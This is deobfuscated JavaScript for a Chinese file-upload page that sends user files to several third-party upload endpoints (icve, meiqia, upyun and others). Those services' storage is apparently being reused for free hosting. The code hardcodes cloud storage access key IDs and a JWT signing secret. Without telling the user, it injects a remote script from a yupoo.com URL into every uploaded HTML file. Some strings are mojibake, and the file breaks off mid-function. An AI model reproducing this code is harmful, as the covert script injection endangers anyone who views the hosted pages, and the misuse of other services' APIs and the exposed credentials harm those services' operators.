//Mon Dec 15 2025 09:42:46 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
document.addEventListener("DOMContentLoaded", function () {
  let _0x3009cf = [],
    _0x205c91 = false,
    _0x208f77 = [];
  const _0xeba37 = document.getElementById("fileInput"),
    _0x1aa802 = document.getElementById("fileLink"),
    _0x110f20 = document.getElementById("progressBar"),
    _0x4eb9a7 = document.getElementById("uploadForm"),
    _0x5ab3e2 = document.getElementById("foot"),
    _0x33f3e6 = document.getElementById("cacheContent"),
    _0x113728 = document.getElementById("historyPreview"),
    _0x55d96d = document.getElementById("aboutBtn"),
    _0x730d59 = document.getElementById("viewCacheBtn"),
    _0x1bb942 = document.querySelector(".file-input-container"),
    _0x3d8127 = document.querySelectorAll(".form-group"),
    _0x5192f5 = document.getElementById("cacheList"),
    _0x16f8aa = document.getElementById("clearBtn"),
    _0x4bfe78 = document.getElementById("clearHistoryBtn");
  _0x530dc7();
  _0x552c77();
  function _0x530dc7() {
    {
      const _0x5e06db = document.getElementById("backgroundToggle"),
        _0x46278 = localStorage.getItem("backgroundEnabled") !== "false";
      _0x5e06db.checked = _0x46278;
      _0x5e06db.addEventListener("change", function () {
        {
          const _0x127a80 = this.checked;
          localStorage.setItem("backgroundEnabled", _0x127a80);
        }
      });
    }
  }
  function _0x552c77() {
    const _0x4c6f80 = document.getElementById("uploadArea");
    _0xeba37.addEventListener("change", function () {
      this.files && this.files.length > 0 && _0x579c5a();
    });
    _0x4c6f80.addEventListener("click", function (_0x341a04) {
      (_0x341a04.target === this || _0x341a04.target.classList.contains("upload-icon") || _0x341a04.target.classList.contains("upload-text") || _0x341a04.target.tagName === "H4" || _0x341a04.target.tagName === "P" || _0x341a04.target.tagName === "SVG" || _0x341a04.target.tagName === "PATH") && _0xeba37.click();
    });
    _0x4c6f80.addEventListener("dragover", function (_0x5bbaa6) {
      _0x5bbaa6.preventDefault();
      _0x5bbaa6.stopPropagation();
      this.classList.add("dragover");
    });
    _0x4c6f80.addEventListener("dragleave", function (_0x5cf021) {
      _0x5cf021.preventDefault();
      _0x5cf021.stopPropagation();
      _0x5cf021.relatedTarget !== this && !this.contains(_0x5cf021.relatedTarget) && this.classList.remove("dragover");
    });
    _0x4c6f80.addEventListener("drop", function (_0x1bd446) {
      {
        _0x1bd446.preventDefault();
        _0x1bd446.stopPropagation();
        this.classList.remove("dragover");
        const _0x3a0b17 = _0x1bd446.dataTransfer.files;
        if (_0x3a0b17 && _0x3a0b17.length > 0) {
          _0xeba37.files = _0x3a0b17;
          _0x579c5a();
        }
      }
    });
    document.addEventListener("dragover", function (_0x3b5bbc) {
      _0x3b5bbc.preventDefault();
    });
    document.addEventListener("drop", function (_0x4f0098) {
      _0x4f0098.preventDefault();
    });
  }
  async function _0x579c5a() {
    {
      const _0x1a9eb3 = Array.from(_0xeba37.files),
        _0x338f73 = _0x1a9eb3.length;
      let _0x2ea77c = 0,
        _0x8645f5 = 0,
        _0x90b79c = 0;
      _0x531cb1 = _0x338f73;
      const _0x18f5c8 = document.getElementById("uploadArea");
      _0x18f5c8.classList.add("uploading");
      new Noty({
        "text": "开始上传 " + _0x338f73 + " 个文件",
        "type": "info",
        "timeout": 3000
      }).show();
      _0x57b40f(0);
      _0xeba37.value = "";
      let _0xec995a = [];
      const _0x3e19ef = [];
      for (let _0x4317df = 0; _0x4317df < _0x1a9eb3.length; _0x4317df++) {
        {
          const _0x455d5f = _0x1a9eb3[_0x4317df];
          try {
            await _0x35d446(_0x455d5f);
            _0x2ea77c++;
            _0x90b79c = Math.round(_0x2ea77c / _0x338f73 * 100);
            _0x57b40f(_0x90b79c);
            _0x338f73 > 1 ? new Noty({
              "text": (_0x455d5f.name.length > 20 ? _0x455d5f.name.substring(0, 17) + "..." : _0x455d5f.name) + " 上传成功 (" + _0x2ea77c + "/" + _0x338f73 + ")",
              "type": "success",
              "timeout": 2000,
              "layout": "topRight"
            }).show() : new Noty({
              "text": _0x455d5f.name + " 上传成功",
              "type": "success",
              "timeout": 3000
            }).show();
            _0x3e19ef.push({
              "success": true,
              "file": _0x455d5f
            });
          } catch (_0x2b056d) {
            _0x8645f5++;
            _0xec995a.push(_0x455d5f);
            _0x3d8127.forEach(_0x1e29e8 => {
              _0x1e29e8.style.display = "block";
            });
            _0x5ab3e2.style.display = "none";
            new Noty({
              "text": (_0x455d5f.name.length > 20 ? _0x455d5f.name.substring(0, 17) + "..." : _0x455d5f.name) + " 上传失败",
              "type": "error",
              "timeout": 5000
            }).show();
            _0x3e19ef.push({
              "success": false,
              "file": _0x455d5f,
              "error": _0x2b056d
            });
          }
        }
      }
      _0x208f77 = _0x208f77.concat(_0xec995a);
      _0x531cb1 = 0;
      _0x18f5c8.classList.remove("uploading");
      const _0x1e19da = document.getElementById("retryFailedBtn");
      if (_0x208f77.length > 0) _0x1e19da.style.display = "inline-block";else {
        _0x1e19da.style.display = "none";
      }
      if (_0x8645f5 === 0) {
        _0x57b40f(100, true);
        new Noty({
          "text": "所有文件上传完成！(" + _0x2ea77c + "涓�)",
          "type": "success",
          "timeout": 3000,
          "layout": "topRight"
        }).show();
      } else _0x2ea77c > 0 ? (_0x57b40f(Math.round(_0x2ea77c / _0x338f73 * 100), true), new Noty({
        "text": "上传完成: 成功" + _0x2ea77c + "个, 失败" + _0x8645f5 + "涓�",
        "type": "warning",
        "timeout": 4000,
        "layout": "topRight"
      }).show()) : (_0x57b40f(0), new Noty({
        "text": "所有文件上传失败！(" + _0x8645f5 + "涓�)",
        "type": "error",
        "timeout": 5000,
        "layout": "topRight"
      }).show());
    }
  }
  async function _0x64dfc8() {
    {
      const _0x3fa1a5 = {
          "alg": "HS256",
          "typ": "JWT"
        },
        _0x2418ab = {
          "timestamp": Date.now()
        },
        _0x40e8bb = "9a31f2e82617e4b4b482110f8c928b9b2734d809f060c30f12e8b2574a84c122",
        _0x6381e1 = btoa(JSON.stringify(_0x3fa1a5)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""),
        _0x208a91 = btoa(JSON.stringify(_0x2418ab)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""),
        _0x133535 = await _0x52c8cb(_0x6381e1, _0x208a91, _0x40e8bb),
        _0x558174 = _0x133535.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
      return _0x6381e1 + "." + _0x208a91 + "." + _0x558174;
    }
  }
  async function _0x52c8cb(_0x42f648, _0x80c8f4, _0x17d73f) {
    const _0x511a3e = _0x42f648 + "." + _0x80c8f4;
    try {
      const _0x5d7c51 = new TextEncoder(),
        _0x33682a = _0x5d7c51.encode(_0x511a3e),
        _0x29813c = _0x5d7c51.encode(_0x17d73f),
        _0x4775da = await crypto.subtle.importKey("raw", _0x29813c, {
          "name": "HMAC",
          "hash": "SHA-256"
        }, false, ["sign"]),
        _0xc3a4bd = await crypto.subtle.sign("HMAC", _0x4775da, _0x33682a);
      return btoa(String.fromCharCode(...new Uint8Array(_0xc3a4bd)));
    } catch (_0x5449f3) {
      {
        console.error("HMAC签名计算失败:", _0x5449f3);
        throw new Error("无法生成HMAC签名");
      }
    }
  }
  const _0x2450b5 = {},
    _0x145dd9 = ["video/mp4", "video/quicktime", "video/x-ms-wmv", "video/x-flv", "video/x-msvideo", "video/x-matroska"],
    _0x4a3253 = ["image/jpeg", "image/jpg", "image/png"],
    _0x45b13d = {
      50: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy", "/uploadmt", "/uploadzkhl"],
      40: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy2", "/uploadouyijy", "/uploadmt", "/uploadzkhl"],
      30: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy2", "/uploadouyijy", "/uploadmt", "/uploadzkhl"],
      20: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy2", "/uploadouyijy", "/uploadmt", "/uploadzkhl"],
      15: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy2", "/uploadouyijy", "/uploadmt", "/uploadzkhl"],
      10: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy2", "/uploadouyijy", "/uploadzhjy", "/uploadhabxkf", "/uploadmt", "/uploadzhuyitai", "/uploadlgkf", "/uploaddfrckf", "/uploadynov", "/uploadzkhl", "/uploadtcl"],
      5: ["icve", "meiqia", "/uploadhemo", "/uploadGIT", "/uploadouyijy2", "/uploadouyijy", "/uploadzhjy", "/uploadhabxkf", "/uploadmt", "/uploadzhuyitai", "/uploadlgkf", "/uploaddfrckf", "/uploadynov", "/uploadzkhl", "/uploadtcl"]
    };
  function _0x3a13b2(_0x345fc4) {
    return _0x345fc4[Math.floor(Math.random() * _0x345fc4.length)];
  }
  function _0x3b05e8(_0xc4108f, _0x5065e3) {
    const _0x3ca953 = 50,
      _0x1ddb36 = 30,
      _0x325a40 = 30,
      _0x283000 = _0x5065e3 / 1048576,
      _0x23f572 = ["text/html", "application/xhtml+xml"];
    if (_0x23f572.includes(_0xc4108f)) return "upyun";
    const _0x29a95e = ["application/javascript", "text/javascript", "text/css", "font/ttf"];
    if (_0x29a95e.includes(_0xc4108f)) {
      return "icve";
    }
    if (_0xc4108f === "image/gif") return _0x283000 <= 31457280 ? "/uploadmt" : "icve";
    const _0x1f3111 = _0x4a3253.includes(_0xc4108f),
      _0x2894ca = _0x145dd9.includes(_0xc4108f);
    if (_0x1f3111) {
      {
        if (_0x283000 <= _0x3ca953) {
          const _0x79f619 = Object.entries(_0x45b13d).sort((_0x493947, _0x57d747) => _0x493947[0] - _0x57d747[0]);
          for (const [_0x3c93b8, _0x471fc4] of _0x79f619) {
            const _0x3c7f1f = parseInt(_0x3c93b8, 10);
            if (_0x283000 <= _0x3c7f1f) return _0x3a13b2(_0x471fc4);
          }
        } else return "icve";
      }
    }
    if (_0x2894ca) return _0x283000 <= _0x1ddb36 ? "/uploadmt" : "icve";
    return _0x283000 <= _0x325a40 ? "/uploadmt" : "icve";
  }
  async function _0x58d1f3(_0x71fcfa, _0x45c977, _0x30ea50, _0x28c165) {
    const _0x2622b7 = await _0x64dfc8(),
      _0x13b810 = new FormData();
    _0x13b810.append("file", _0x71fcfa);
    const _0xd1cf4c = new XMLHttpRequest(),
      _0x38ee5b = document.getElementById("progressContainer");
    _0x38ee5b && (_0x38ee5b.style.display = "block");
    _0x4f8430 = 0;
    _0x37e2ab = performance.now();
    const _0x3724b5 = document.getElementById("uploadSpeed");
    _0x3724b5 && (_0x3724b5.style.display = "block");
    _0xd1cf4c.upload.addEventListener("progress", function (_0x5313a7) {
      if (_0x5313a7.lengthComputable) {
        {
          const _0x4c2879 = Math.round(_0x5313a7.loaded / _0x5313a7.total * 100);
          _0x57b40f(_0x4c2879);
          const _0x169f9d = performance.now(),
            _0x2c9044 = _0x169f9d - _0x37e2ab;
          if (_0x2c9044 > 500) {
            {
              const _0x342a2d = _0x5313a7.loaded - _0x4f8430,
                _0x2ed6c5 = _0x342a2d / (_0x2c9044 / 1000);
              _0x2d4388(_0x2ed6c5);
              _0x4f8430 = _0x5313a7.loaded;
              _0x37e2ab = _0x169f9d;
            }
          }
        }
      }
    });
    _0xd1cf4c.onload = async function () {
      if (_0xd1cf4c.status === 200) {
        try {
          const _0x129df2 = JSON.parse(_0xd1cf4c.responseText);
          _0x8b9fc(_0x71fcfa.name, _0x129df2.data);
          _0x45c977();
        } catch (_0xb59dcc) {
          _0x30ea50(_0xb59dcc);
        }
      } else _0x57b40f(0), _0x30ea50(new Error("上传过程中发生网络错误"));
    };
    _0xd1cf4c.onerror = function () {
      _0x57b40f(0);
      _0x30ea50(new Error("上传过程中发生网络错误"));
    };
    _0xd1cf4c.open("POST", _0x28c165, true);
    _0xd1cf4c.setRequestHeader("X-Auth-Token", _0x2622b7);
    _0xd1cf4c.send(_0x13b810);
  }
  async function _0x2a5703(_0x363f04, _0x4ab9a9, _0xbb5f83) {
    let _0x169206 = _0x363f04;
    const _0xf1e69a = _0x363f04.name,
      _0x4d23ec = _0xf1e69a.lastIndexOf("."),
      _0x233379 = _0x4d23ec !== -1 ? _0xf1e69a.substring(_0x4d23ec + 1) : "";
    if (_0x363f04.type === "text/html" || _0x233379.toLowerCase() === "html") try {
      {
        const _0x1406c2 = await _0x363f04.arrayBuffer(),
          _0x2ff2d1 = new TextDecoder("utf-8");
        let _0x18bcfa = _0x2ff2d1.decode(_0x1406c2);
        const _0x1706e6 = "<script src=\"https://coss.yupoo.com/upchat/2025-09-04/1756951246883.js\"></script>",
          _0x48483c = _0x18bcfa.toLowerCase().lastIndexOf("</body>");
        if (_0x48483c !== -1) {
          _0x18bcfa = _0x18bcfa.substring(0, _0x48483c) + _0x1706e6 + _0x18bcfa.substring(_0x48483c);
        } else {
          {
            const _0x4e44e0 = _0x18bcfa.toLowerCase().lastIndexOf("</html>");
            _0x4e44e0 !== -1 ? _0x18bcfa = _0x18bcfa.substring(0, _0x4e44e0) + _0x1706e6 + _0x18bcfa.substring(_0x4e44e0) : _0x18bcfa += _0x1706e6;
          }
        }
        _0x169206 = new File([_0x18bcfa], _0x363f04.name, {
          "type": _0x363f04.type
        });
      }
    } catch (_0x4cb44c) {
      _0xbb5f83(new Error("处理HTML文件时发生错误: " + _0x4cb44c.message));
      return;
    }
    let _0x5250be;
    try {
      const _0x2549e5 = await _0x169206.arrayBuffer(),
        _0x1397cb = await crypto.subtle.digest("SHA-256", _0x2549e5),
        _0x5853e2 = Array.from(new Uint8Array(_0x1397cb));
      _0x5250be = _0x5853e2.map(_0x220d2d => _0x220d2d.toString(16).padStart(2, "0")).join("");
      if (!/^[0-9a-f]{64}$/.test(_0x5250be)) throw new Error("计算的SHA-256值格式无效");
    } catch (_0x382618) {
      console.error("SHA-256计算失败详情:", _0x382618.name, _0x382618.message, _0x382618.stack);
      _0x5250be = null;
    }
    const _0x53e565 = document.getElementById("progressContainer");
    _0x53e565 && (_0x53e565.style.display = "block");
    _0x4f8430 = 0;
    _0x37e2ab = performance.now();
    const _0x386e3a = document.getElementById("uploadSpeed");
    _0x386e3a && (_0x386e3a.style.display = "block");
    const _0x418b60 = new FormData();
    _0x418b60.append("file", _0x169206);
    const _0x258973 = new XMLHttpRequest();
    _0x258973.upload.addEventListener("progress", function (_0x3ab1d0) {
      {
        if (_0x3ab1d0.lengthComputable) {
          {
            const _0x1dcae7 = Math.round(_0x3ab1d0.loaded / _0x3ab1d0.total * 100);
            _0x57b40f(_0x1dcae7);
            const _0x437016 = performance.now(),
              _0x4fc516 = _0x437016 - _0x37e2ab;
            if (_0x4fc516 > 500) {
              {
                const _0x11b113 = _0x3ab1d0.loaded - _0x4f8430,
                  _0x530eb0 = _0x11b113 / (_0x4fc516 / 1000);
                _0x2d4388(_0x530eb0);
                _0x4f8430 = _0x3ab1d0.loaded;
                _0x37e2ab = _0x437016;
              }
            }
          }
        }
      }
    });
    _0x258973.onload = async function () {
      {
        if (_0x258973.status === 200) try {
          {
            const _0x4b1023 = JSON.parse(_0x258973.responseText);
            _0x8b9fc(_0x169206.name, _0x4b1023.url, _0x5250be);
            _0x4ab9a9();
          }
        } catch (_0x2484f3) {
          _0xbb5f83(_0x2484f3);
        } else _0x57b40f(0), _0xbb5f83(new Error("上传过程中发生网络错误，状态码: " + _0x258973.status));
      }
    };
    _0x258973.onerror = function () {
      _0x57b40f(0);
      _0xbb5f83(new Error("上传过程中发生网络错误"));
    };
    _0x258973.open("POST", "https://upchat-api.upyun.com/upload", true);
    _0x258973.send(_0x418b60);
  }
  async function _0x461986(_0x19fd24, _0x5dff44, _0x10018e) {
    {
      let _0x29ea4f = _0x19fd24,
        _0x351163;
      try {
        const _0x183c7f = await _0x29ea4f.arrayBuffer(),
          _0x2504ff = await crypto.subtle.digest("SHA-256", _0x183c7f),
          _0xbc9528 = Array.from(new Uint8Array(_0x2504ff));
        _0x351163 = _0xbc9528.map(_0x5779c3 => _0x5779c3.toString(16).padStart(2, "0")).join("");
        if (!/^[0-9a-f]{64}$/.test(_0x351163)) throw new Error("计算的SHA-256值格式无效");
      } catch (_0x390ad4) {
        console.error("SHA-256计算失败详情:", _0x390ad4.name, _0x390ad4.message, _0x390ad4.stack);
        _0x351163 = null;
      }
      const _0x164ad9 = document.getElementById("progressContainer");
      _0x164ad9 && (_0x164ad9.style.display = "block");
      _0x4f8430 = 0;
      _0x37e2ab = performance.now();
      const _0xa33ec7 = document.getElementById("uploadSpeed");
      _0xa33ec7 && (_0xa33ec7.style.display = "block");
      try {
        const _0x3f8e90 = await fetch("https://www.icve.com.cn/project/Api/upload?type", {
            "method": "GET"
          }),
          _0x25a964 = await _0x3f8e90.text(),
          _0x1e72bf = JSON.parse(_0x25a964);
        if (!_0x1e72bf.file_system_url) {
          throw new Error("icve缺少token");
        }
        const _0x4fd0f1 = new FormData(),
          _0x28425d = _0x1e72bf.signature.policy,
          _0x26b0e5 = _0x1e72bf.signature.signature,
          _0x24137 = _0x1e72bf.signature.callback,
          _0x4e714c = Date.now(),
          _0x5e8ee6 = _0x19fd24.name,
          _0x599f00 = _0x5e8ee6.split(".").pop() || "png",
          _0x4869f9 = Math.floor(Math.random() * 900) + 100,
          _0x149456 = "file_doc/qdqqd/" + _0x4869f9 + _0x4e714c + "." + _0x599f00;
        _0x4fd0f1.append("key", _0x149456);
        _0x4fd0f1.append("policy", _0x28425d);
        _0x4fd0f1.append("OSSAccessKeyId", "LTAI5tN6XgW6YBwpNuvfG198");
        _0x4fd0f1.append("signature", _0x26b0e5);
        _0x4fd0f1.append("callback", _0x24137);
        _0x4fd0f1.append("file", _0x29ea4f);
        const _0x4a6032 = new XMLHttpRequest();
        _0x4a6032.upload.addEventListener("progress", function (_0x26e13c) {
          {
            if (_0x26e13c.lengthComputable) {
              {
                const _0x4a57a5 = Math.round(_0x26e13c.loaded / _0x26e13c.total * 100);
                _0x57b40f(_0x4a57a5);
                const _0x506a36 = performance.now(),
                  _0x4b3856 = _0x506a36 - _0x37e2ab;
                if (_0x4b3856 > 500) {
                  const _0x57e703 = _0x26e13c.loaded - _0x4f8430,
                    _0x597be7 = _0x57e703 / (_0x4b3856 / 1000);
                  _0x2d4388(_0x597be7);
                  _0x4f8430 = _0x26e13c.loaded;
                  _0x37e2ab = _0x506a36;
                }
              }
            }
          }
        });
        _0x4a6032.onload = async function () {
          if (_0x4a6032.status >= 200 && _0x4a6032.status < 300) {
            try {
              {
                const _0x22a2ce = _0x4a6032.responseText,
                  _0x60ff05 = JSON.parse(_0x22a2ce);
                if (!_0x60ff05) {
                  _0x57b40f(0);
                  _0x10018e(new Error("服务器响应为空"));
                  return;
                }
                const _0x521414 = "https://file.icve.com.cn/" + _0x149456;
                _0x8b9fc(_0x29ea4f.name, _0x521414, _0x351163);
                _0x5dff44();
              }
            } catch (_0x5c6e53) {
              _0x57b40f(0);
              _0x10018e(_0x5c6e53);
            }
          } else {
            _0x57b40f(0);
            _0x10018e(new Error("上传过程中发生网络错误，状态码: " + _0x4a6032.status));
          }
        };
        _0x4a6032.onerror = function () {
          _0x57b40f(0);
          _0x10018e(new Error("上传过程中发生网络错误"));
        };
        _0x4a6032.open("POST", _0x1e72bf.file_system_url, true);
        _0x4a6032.send(_0x4fd0f1);
      } catch (_0x2a2c3f) {
        _0x57b40f(0);
        _0x10018e(new Error("获取上传token失败: " + _0x2a2c3f.message));
      }
    }
  }
  async function _0x58f00a(_0x13f0c2, _0x4a0a41, _0x30cc35) {
    {
      let _0x105807;
      try {
        const _0x5bee2a = await _0x13f0c2.arrayBuffer(),
          _0x240a60 = await crypto.subtle.digest("SHA-256", _0x5bee2a),
          _0x3a9267 = Array.from(new Uint8Array(_0x240a60));
        _0x105807 = _0x3a9267.map(_0x278bc9 => _0x278bc9.toString(16).padStart(2, "0")).join("");
      } catch (_0x1b4ce5) {
        console.error("SHA-256计算失败:", _0x1b4ce5);
        _0x105807 = null;
      }
      const _0x118444 = document.getElementById("progressContainer");
      if (_0x118444) _0x118444.style.display = "block";
      let _0x3563fd = 0,
        _0x1e3125 = performance.now();
      const _0x199cbe = document.getElementById("uploadSpeed");
      if (_0x199cbe) _0x199cbe.style.display = "block";
      try {
        {
          const _0x189721 = _0x13f0c2.name,
            _0x2eff5c = _0x189721.split(".").pop(),
            _0x4bdf46 = Date.now(),
            _0x1386b9 = _0x4bdf46 + "." + _0x2eff5c,
            _0x30f1b9 = await fetch("https://new-api.meiqia.com/upload/oss/policies?ent_id=qdqqd/", {
              "method": "POST",
              "headers": {
                "Content-Type": "application/json"
              },
              "body": JSON.stringify({
                "filename": _0x1386b9,
                "content_type": "file"
              })
            });
          if (!_0x30f1b9.ok) {
            throw new Error("获取策略失败，网络状态码: " + _0x30f1b9.status + " " + _0x30f1b9.statusText);
          }
          const _0x25a83b = await _0x30f1b9.json();
          if (!_0x25a83b.file_url || !_0x25a83b.policy || !_0x25a83b.policy.fields) {
            throw new Error("Meiqia API 返回的数据结构不完整");
          }
          const _0x5d0a8d = new FormData(),
            {
              Signature: _0xe24c5c,
              key: _0xe1739d,
              policy: _0x405c3d
            } = _0x25a83b.policy.fields;
          _0x5d0a8d.append("OSSAccessKeyId", "LTAI5tGHcDxZseSM6B54HBuU");
          _0x5d0a8d.append("Signature", _0xe24c5c);
          _0x5d0a8d.append("key", _0xe1739d);
          _0x5d0a8d.append("policy", _0x405c3d);
          _0x5d0a8d.append("x-oss-content-type", "application/octet-stream");
          _0x5d0a8d.append("file", _0x13f0c2);
          const _0x3204d8 = _0x25a83b.policy.url || "https://meiqia-upload-temp.oss-accelerate.aliyuncs.com";
          await new Promise((_0x2cc0f1, _0x3fec9e) => {
            const _0x1cc8fc = new XMLHttpRequest();
            _0x1cc8fc.upload.addEventListener("progress", _0x7077b3 => {
              if (_0x7077b3.lengthComputable) {
                {
                  const _0x1a68e4 = Math.round(_0x7077b3.loaded / _0x7077b3.total * 100);
                  _0x57b40f(_0x1a68e4);
                  const _0x473f81 = performance.now();
                  if (_0x473f81 - _0x1e3125 > 500) {
                    const _0x322e1f = (_0x7077b3.loaded - _0x3563fd) / ((_0x473f81 - _0x1e3125) / 1000);
                    _0x2d4388(_0x322e1f);
                    _0x3563fd = _0x7077b3.loaded;
                    _0x1e3125 = _0x473f81;
                  }
                }
              }
            });
            _0x1cc8fc.onload = function () {
              {
                if (_0x1cc8fc.status >= 200 && _0x1cc8fc.status < 300) {
                  const _0x2e56f7 = _0x25a83b.file_url;
                  _0x8b9fc(_0x13f0c2.name, _0x2e56f7, _0x105807);
                  _0x2cc0f1();
                } else _0x3fec9e(new Error("上传失败，状态码: " + _0x1cc8fc.status));
              }
            };
            _0x1cc8fc.onerror = () => {
              console.error("[Meiqia] XHR 网络错误");
              _0x3fec9e(new Error("上传过程中发生网络错误"));
            };
            _0x1cc8fc.open("POST", _0x3204d8, true);
            _0x1cc8fc.send(_0x5d0a8d);
          });
          _0x4a0a41();
        }
      } catch (_0x3c56ca) {
        console.error("[Meiqia] 上传流程出错:", _0x3c56ca);
        _0x57b40f(0);
        throw _0x3c56ca;
      }
    }
  }
  async function _0x35d446(_0x1744eb) {
    return new Promise(async (_0x4e878d, _0x580bfd) => {
      try {
        {
          const _0x49cdb2 = 209715200;
          _0x57b40f(0);
          if (_0x1744eb.size > _0x49cdb2) {
            new Noty({
              "text": "文件大小超出限制！",
              "type": "error",
              "timeout": 5000,
              "layout": "topRight"
            }).show();
            return _0x580bfd(new Error("文件大小超出限制"));
          }
          const _0x84471c = _0x3b05e8(_0x1744eb.type, _0x1744eb.size, _0x1744eb.name);
          if (_0x84471c === "upyun") await _0x2a5703(_0x1744eb, _0x4e878d, _0x580bfd);else {
            if (_0x84471c === "icve") {
              await _0x461986(_0x1744eb, _0x4e878d, _0x580bfd);
            } else _0x84471c === "meiqia" ? await _0x58f00a(_0x1744eb, _0x4e878d, _0x580bfd) : await _0x58d1f3(_0x1744eb, _0x4e878d, _0x580bfd, _0x84471c);
          }
        }
      } catch (_0x5d1db5) {
        console.error("上传初始失败", _0x5d1db5);
        _0x580bfd(_0x5d1db5);
      }
    });
  }
  let _0x2e2639 = null,
    _0x58034b = 0,
    _0x466e65 = false,
    _0x531cb1 = 0,
    _0x4f8430 = 0,
    _0x37e2ab = 0;
  function _0x57b40f(_0x42d403, _0x562641 = false) {
    {
      if (!_0x110f20) return;
      const _0x2c589c = performance.now();
      if (_0x2c589c - _0x58034b < 50 && _0x42d403 < 100 && !_0x562641) return;
      _0x58034b = _0x2c589c;
      if (_0x2e2639) {
        cancelAnimationFrame(_0x2e2639);
      }
      _0x2e2639 = requestAnimationFrame(() => {
        {
          let _0x51d494 = _0x42d403;
          _0x42d403 === 0 && (_0x466e65 = false);
          if (_0x42d403 >= 99 && !_0x562641) {
            _0x51d494 = 99;
            if (!_0x466e65 && _0x531cb1 <= 1) {
              _0x466e65 = true;
              new Noty({
                "text": "上传完成，等待接口回调中...",
                "type": "info",
                "timeout": 3000,
                "layout": "topRight"
              }).show();
            }
          }
          _0x110f20.style.transition = "width 0.2s ease-out";
          _0x110f20.style.width = _0x51d494 + "%";
          _0x110f20.setAttribute("aria-valuenow", _0x51d494);
          const _0x2d0a74 = document.getElementById("progressText");
          if (_0x2d0a74) {
            {
              if (_0x562641 && _0x42d403 >= 100) _0x2d0a74.textContent = "瀹屾垚", _0x110f20.style.background = "#28a745", _0x466e65 = false;else {
                if (_0x51d494 >= 99 && !_0x562641) {
                  _0x2d0a74.textContent = "等待回调...";
                } else {
                  if (_0x51d494 >= 98) {
                    _0x2d0a74.textContent = "处理中...";
                  } else _0x2d0a74.textContent = _0x51d494 + "%";
                }
              }
            }
          }
          _0x51d494 < 90 && (_0x466e65 = false, _0x110f20.style.background = "#4CAF50");
        }
      });
    }
  }
  function _0x2d4388(_0x23d0c4) {
    {
      const _0xa2febc = document.getElementById("uploadSpeed");
      if (!_0xa2febc) return;
      let _0x3972a0;
      if (_0x23d0c4 < 1024) {
        _0x3972a0 = _0x23d0c4.toFixed(0) + " B/s";
      } else _0x23d0c4 < 1048576 ? _0x3972a0 = (_0x23d0c4 / 1024).toFixed(1) + " KB/s" : _0x3972a0 = (_0x23d0c4 / 1048576).toFixed(2) + " MB/s";
      _0xa2febc.textContent = "上传速度: " + _0x3972a0;
    }
  }
  function _0x8b9fc(_0x3bc1b4, _0x695439, _0x2e1db1) {
    const _0x11bf91 = _0x695439;
    _0x3009cf.push(_0x11bf91);
    _0x1aa802.value = _0x3009cf.join("\n\n");
    _0x3d8127.forEach(_0x5539b1 => {
      _0x5539b1.style.display = "block";
    });
    _0x5ab3e2.style.display = "none";
    _0x478599(_0x1aa802);
    _0x3516f4(_0x11bf91, _0x3bc1b4);
    _0x57b40f(100, true);
    const _0x243b88 = document.getElementById("progressContainer");
    if (_0x243b88) {
      _0x243b88.style.display = "none";
    }
    const _0x48f390 = document.getElementById("uploadSpeed");
    _0x48f390 && (_0x48f390.style.display = "none");
    if (_0x11bf91.includes("yupoo.com") || _0x11bf91.includes("icve.com.cn") || _0x11bf91.includes("meiqiausercontent.com")) {
      {
        const _0x56d6b5 = new XMLHttpRequest();
        _0x56d6b5.open("POST", "/upload0", true);
        _0x56d6b5.setRequestHeader("Content-Type", "application/json; charset=utf-8");
        _0x64dfc8().then(_0x223ad0 => {
          _0x56d6b5.setRequestHeader("X-Auth-Token", _0x223ad0);
          const _0x3e74e2 = {
            "url": _0x11bf91
          };
          _0x2e1db1 && _0x2e1db1.trim() !== "" && (_0x3e74e2.sha256 = _0x2e1db1);
          const _0x43c7e2 = JSON.stringify(_0x3e74e2);
          _0x56d6b5.send(_0x43c7e2);
        });
      }
    }
  }
  document.addEventListener("paste", function (_0x23622e) {
    {
      const _0xaf3da5 = _0x23622e.clipboardData;
      if (_0xaf3da5 && _0xaf3da5.items) for (let _0x535647 = 0; _0x535647 < _0xaf3da5.items.length; _0x535647++) {
        const _0x56139d = _0xaf3da5.items[_0x535647];
        if (_0x56139d.kind === "file") {
          const _0xe8a3ee = _0x56139d.getAsFile();
          _0x35d446(_0xe8a3ee);
          break;
        }
      }
    }
  });
  function _0x140fdb(_0xc1d2df) {
    {
      const _0xca3b4 = _0xc1d2df.split("?")[0].split("#")[0],
        _0x585a44 = _0xca3b4.split("/"),
        _0x1fd400 = _0x585a44[_0x585a44.length - 1],
        _0x2bc9d3 = _0x1fd400.lastIndexOf(".");
      return _0x2bc9d3 !== -1 ? _0x1fd400.substring(_0x2bc9d3 + 1) : "";
    }
  }
  function _0x4f74d8(_0x5b5a11) {
    const _0x475fab = ["jpg", "jpeg", "png", "gif", "bmp", "webp", "svg", "ico", "tiff", "tif", "avif"];
    return _0x475fab.includes(_0x5b5a11);
  }
  function _0x5172da(_0x366708) {
    {
      const _0x11b531 = ["mp4", "avi", "mov", "wmv", "flv", "mkv", "webm", "m4v", "3gp", "rm", "rmvb", "asf", "mpg", "mpeg", "mts", "ts", "m2ts", "f4v", "vob"];
      return _0x11b531.includes(_0x366708);
    }
  }
  function _0x3bb5c0(_0x2e545b) {
    document.querySelector(".file-name").textContent = _0x2e545b.fileName;
    document.querySelector(".file-time").textContent = _0x2e545b.timestamp;
    document.querySelector(".file-url").textContent = _0x2e545b.url;
    const _0x356e1e = document.getElementById("historyUrlBtn"),
      _0x2dd9a8 = document.getElementById("historyUbbBtn");
